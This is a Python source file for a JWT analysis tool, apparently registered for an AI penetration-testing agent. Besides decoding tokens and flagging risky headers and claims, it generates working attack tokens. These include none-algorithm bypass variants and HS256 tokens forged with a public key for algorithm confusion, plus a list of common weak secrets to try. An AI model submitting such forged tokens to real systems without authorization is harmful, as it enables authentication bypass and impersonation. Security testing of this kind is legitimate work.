"""JWT Analyzer tool for analyzing and testing JWT tokens."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any, Literal

from strix.tools.registry import register_tool


JWTAction = Literal["decode", "analyze", "test_none_alg", "test_alg_confusion", "validate_claims"]


def _base64url_decode(data: str) -> bytes:
    """Decode base64url encoded data."""
    # Add padding if needed
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _base64url_encode(data: bytes) -> str:
    """Encode data as base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _decode_jwt_parts(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    """Decode JWT into header, payload, and signature."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")

    try:
        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        signature = parts[2]
    except (json.JSONDecodeError, ValueError) as e:
        raise ValueError(f"Failed to decode JWT: {e}") from e

    return header, payload, signature


def _analyze_header(header: dict[str, Any]) -> dict[str, Any]:
    """Analyze JWT header for security issues."""
    analysis: dict[str, Any] = {
        "algorithm": header.get("alg", "unknown"),
        "type": header.get("typ", "unknown"),
        "issues": [],
        "info": [],
    }

    alg = header.get("alg", "").upper()

    # Check for none algorithm
    if alg in {"NONE", ""}:
        analysis["issues"].append({
            "severity": "critical",
            "issue": "None algorithm detected",
            "description": "Token uses 'none' algorithm which means no signature verification",
        })

    # Check for weak algorithms
    if alg in ("HS256", "HS384", "HS512"):
        analysis["info"].append({
            "type": "algorithm",
            "message": f"HMAC algorithm ({alg}) - susceptible to key brute force if weak secret",
        })

    # Check for algorithm confusion potential
    if alg.startswith(("RS", "ES", "PS")):
        analysis["info"].append({
            "type": "algorithm",
            "message": f"Asymmetric algorithm ({alg}) - test for RS256->HS256 confusion attack",
        })

    # Check for dangerous headers
    if "jku" in header:
        analysis["issues"].append({
            "severity": "high",
            "issue": "JKU header present",
            "description": (
                f"JWK Set URL header found: {header['jku']} - potential for key injection"
            ),
        })

    if "x5u" in header:
        analysis["issues"].append({
            "severity": "high",
            "issue": "X5U header present",
            "description": f"X.509 URL header found: {header['x5u']} - potential for key injection",
        })

    if "kid" in header:
        analysis["info"].append({
            "type": "header",
            "message": f"Key ID (kid) present: {header['kid']} - test for injection",
        })

    if "jwk" in header:
        analysis["issues"].append({
            "severity": "high",
            "issue": "Embedded JWK",
            "description": "Token contains embedded public key - may allow key injection",
        })

    return analysis


def _analyze_payload(payload: dict[str, Any]) -> dict[str, Any]:
    """Analyze JWT payload for security issues."""
    analysis: dict[str, Any] = {"claims": {}, "issues": [], "info": []}
    current_time = int(time.time())

    # Standard claims
    if "exp" in payload:
        exp = payload["exp"]
        analysis["claims"]["exp"] = {
            "value": exp,
            "readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(exp)),
            "status": "expired" if exp < current_time else "valid",
        }
        if exp < current_time:
            analysis["info"].append({
                "type": "expiration",
                "message": "Token has expired",
            })
        elif exp > current_time + 86400 * 365:
            analysis["issues"].append({
                "severity": "medium",
                "issue": "Very long expiration",
                "description": "Token expires more than 1 year in the future",
            })

    if "iat" in payload:
        iat = payload["iat"]
        analysis["claims"]["iat"] = {
            "value": iat,
            "readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(iat)),
        }

    if "nbf" in payload:
        nbf = payload["nbf"]
        analysis["claims"]["nbf"] = {
            "value": nbf,
            "readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(nbf)),
            "status": "not yet valid" if nbf > current_time else "valid",
        }

    if "sub" in payload:
        analysis["claims"]["sub"] = payload["sub"]

    if "iss" in payload:
        analysis["claims"]["iss"] = payload["iss"]

    if "aud" in payload:
        analysis["claims"]["aud"] = payload["aud"]

    # Check for sensitive data in payload
    sensitive_patterns = [
        (r"password", "Password field detected in token"),
        (r"secret", "Secret field detected in token"),
        (r"private", "Private data field detected in token"),
        (r"credit.?card", "Credit card field detected in token"),
        (r"ssn", "SSN field detected in token"),
    ]

    for key in payload:
        for pattern, message in sensitive_patterns:
            if re.search(pattern, key, re.IGNORECASE):
                analysis["issues"].append({
                    "severity": "medium",
                    "issue": "Potentially sensitive data",
                    "description": f"{message}: {key}",
                })

    # Check for privilege-related claims
    privilege_claims = [
        "admin", "role", "roles", "permissions", "scope", "is_admin", "is_superuser",
    ]
    for claim in privilege_claims:
        if claim in payload:
            analysis["info"].append({
                "type": "authorization",
                "message": f"Authorization claim found: {claim}={payload[claim]}",
            })

    return analysis


def _test_none_algorithm(token: str) -> dict[str, Any]:
    """Test if server might accept none algorithm."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"error": "Invalid JWT format"}

    _, payload_part, _ = parts

    # Create token with none algorithm
    none_header = _base64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    none_token = f"{none_header}.{payload_part}."

    # Generate header variants for bypass attempts
    none_cap = _base64url_encode(json.dumps({"alg": "None", "typ": "JWT"}).encode())
    none_upper = _base64url_encode(json.dumps({"alg": "NONE", "typ": "JWT"}).encode())
    none_mixed = _base64url_encode(json.dumps({"alg": "nOnE", "typ": "JWT"}).encode())

    # Also test with empty signature variants
    variants = [
        {"name": "alg: none (no signature)", "token": none_token},
        {"name": "alg: None (capitalized)", "token": f"{none_cap}.{payload_part}."},
        {"name": "alg: NONE (uppercase)", "token": f"{none_upper}.{payload_part}."},
        {"name": "alg: nOnE (mixed case)", "token": f"{none_mixed}.{payload_part}."},
    ]

    return {
        "description": "Tokens to test none algorithm bypass",
        "variants": variants,
        "instructions": "Submit these tokens to the API and check if they are accepted",
    }


def _test_algorithm_confusion(token: str, public_key: str | None = None) -> dict[str, Any]:
    """Test for RS256 to HS256 algorithm confusion."""
    try:
        header, payload, _ = _decode_jwt_parts(token)
    except ValueError as e:
        return {"error": str(e)}

    original_alg = header.get("alg", "")

    result: dict[str, Any] = {
        "original_algorithm": original_alg,
        "description": "Algorithm confusion attack testing",
        "variants": [],
    }

    if original_alg.startswith(("RS", "ES", "PS")):
        # Suggest HS256 confusion
        result["attack_info"] = (
            f"Original algorithm is {original_alg} (asymmetric). "
            "If the server uses the public key to verify HS256, you can sign with the public key."
        )

        if public_key:
            # Create HS256 token signed with public key
            new_header = {"alg": "HS256", "typ": "JWT"}
            header_b64 = _base64url_encode(json.dumps(new_header).encode())
            payload_b64 = _base64url_encode(json.dumps(payload).encode())
            signing_input = f"{header_b64}.{payload_b64}"

            signature = hmac.new(
                public_key.encode(),
                signing_input.encode(),
                hashlib.sha256,
            ).digest()
            signature_b64 = _base64url_encode(signature)

            result["variants"].append({
                "name": "HS256 signed with public key",
                "token": f"{signing_input}.{signature_b64}",
            })
        else:
            result["instructions"] = (
                "Provide the public key (from JWKS or certificate) to generate "
                "a token signed with HS256 using the public key as the secret"
            )

    elif original_alg.startswith("HS"):
        result["attack_info"] = (
            f"Original algorithm is {original_alg} (symmetric). "
            "If you can obtain or brute-force the secret, you can forge tokens."
        )
        result["common_secrets"] = [
            "secret",
            "password",
            "your-256-bit-secret",
            "your-secret-key",
            "jwt-secret",
        ]

    return result


def _validate_claims(
    token: str,
    expected_issuer: str | None = None,
    expected_audience: str | None = None,
) -> dict[str, Any]:
    """Validate JWT claims against expected values."""
    try:
        _, payload, _ = _decode_jwt_parts(token)
    except ValueError as e:
        return {"error": str(e)}

    validations: list[dict[str, Any]] = []
    current_time = int(time.time())

    # Expiration
    if "exp" in payload:
        exp = payload["exp"]
        is_valid = exp > current_time
        validations.append({
            "claim": "exp",
            "value": exp,
            "valid": is_valid,
            "message": "Token is valid" if is_valid else "Token has expired",
        })
    else:
        validations.append({
            "claim": "exp",
            "value": None,
            "valid": None,
            "message": "No expiration claim - token never expires",
        })

    # Not Before
    if "nbf" in payload:
        nbf = payload["nbf"]
        is_valid = nbf <= current_time
        validations.append({
            "claim": "nbf",
            "value": nbf,
            "valid": is_valid,
            "message": "Token is active" if is_valid else "Token not yet valid",
        })

    # Issuer
    if expected_issuer:
        iss = payload.get("iss")
        is_valid = iss == expected_issuer
        iss_msg = (
            "Issuer matches"
            if is_valid
            else f"Issuer mismatch: expected {expected_issuer}, got {iss}"
        )
        validations.append({
            "claim": "iss",
            "value": iss,
            "expected": expected_issuer,
            "valid": is_valid,
            "message": iss_msg,
        })

    # Audience
    if expected_audience:
        aud = payload.get("aud")
        is_valid = expected_audience in aud if isinstance(aud, list) else aud == expected_audience
        aud_msg = (
            "Audience matches"
            if is_valid
            else f"Audience mismatch: expected {expected_audience}, got {aud}"
        )
        validations.append({
            "claim": "aud",
            "value": aud,
            "expected": expected_audience,
            "valid": is_valid,
            "message": aud_msg,
        })

    return {"validations": validations}


@register_tool
def jwt_analyzer(
    action: JWTAction,
    token: str,
    public_key: str | None = None,
    expected_issuer: str | None = None,
    expected_audience: str | None = None,
) -> dict[str, Any]:
    """Analyze and test JWT tokens for security vulnerabilities.

    This tool provides comprehensive JWT analysis including:
    - Token decoding and structure analysis
    - Security vulnerability detection
    - Algorithm confusion attack testing
    - None algorithm bypass testing
    - Claims validation

    Args:
        action: The analysis action to perform:
            - decode: Decode and display JWT structure
            - analyze: Full security analysis of the token
            - test_none_alg: Generate tokens for none algorithm testing
            - test_alg_confusion: Test for algorithm confusion attacks
            - validate_claims: Validate token claims
        token: The JWT token to analyze
        public_key: Public key for algorithm confusion testing (optional)
        expected_issuer: Expected issuer for claim validation (optional)
        expected_audience: Expected audience for claim validation (optional)

    Returns:
        Analysis results including decoded token, security issues, and test payloads
    """
    try:
        if action == "decode":
            header, payload, signature = _decode_jwt_parts(token)
            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "signature_length": len(signature),
            }

        if action == "analyze":
            header, payload, signature = _decode_jwt_parts(token)
            header_analysis = _analyze_header(header)
            payload_analysis = _analyze_payload(payload)

            # Calculate overall risk
            if header_analysis["issues"]:
                overall_risk = "high"
            elif payload_analysis["issues"]:
                overall_risk = "medium"
            else:
                overall_risk = "low"

            return {
                "header": header,
                "payload": payload,
                "header_analysis": header_analysis,
                "payload_analysis": payload_analysis,
                "overall_risk": overall_risk,
            }

        if action == "test_none_alg":
            return _test_none_algorithm(token)

        if action == "test_alg_confusion":
            return _test_algorithm_confusion(token, public_key)

        if action == "validate_claims":
            return _validate_claims(token, expected_issuer, expected_audience)

        return {"error": f"Unknown action: {action}"}

    except ValueError as e:
        return {"error": str(e)}
    except (json.JSONDecodeError, TypeError, KeyError) as e:
        return {"error": f"Analysis failed: {e!s}"}
